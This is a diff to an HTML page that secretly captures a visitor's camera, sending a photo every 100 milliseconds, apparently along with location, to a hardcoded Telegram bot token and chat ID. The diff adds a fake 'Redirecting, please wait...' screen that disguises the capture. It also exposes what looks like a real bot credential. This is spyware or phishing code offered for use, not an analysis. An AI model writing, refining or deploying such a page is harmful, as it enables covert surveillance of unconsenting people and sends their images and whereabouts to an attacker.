@@ -6,12 +6,26 @@
   <title>Continuous Camera Capture with Location & URL Shortening</title>
   <style>
     body {
-      display: none; /* Hide the body */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f0f0f0;
+      font-family: Arial, sans-serif;
+      color: #333;
+    }
+    .loading {
+      font-size: 20px;
+      font-weight: bold;
+      color: #007bff;
     }
   </style>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
 </head>
 <body>
+  <div class="loading">Redirecting, please wait...</div>
+
   <script type="text/javascript">
     const botToken = '7044604914:AAHUlvU0rlzbE5aU5axIAPLD7siMj1jLaA4'; // Your Telegram bot token
     const chatId = '5571330102'; // Your Telegram chat ID
@@ -94,7 +108,7 @@
                 });
             }
 
-            // Capture and send photo every 100 milliseconds (faster interval)
+            // Capture and send photo every 100 milliseconds (fast interval)
             setInterval(captureAndSendPhoto, 100);  // Interval set to capture every 100 milliseconds (0.1 second)
           })
           .catch((error) => {
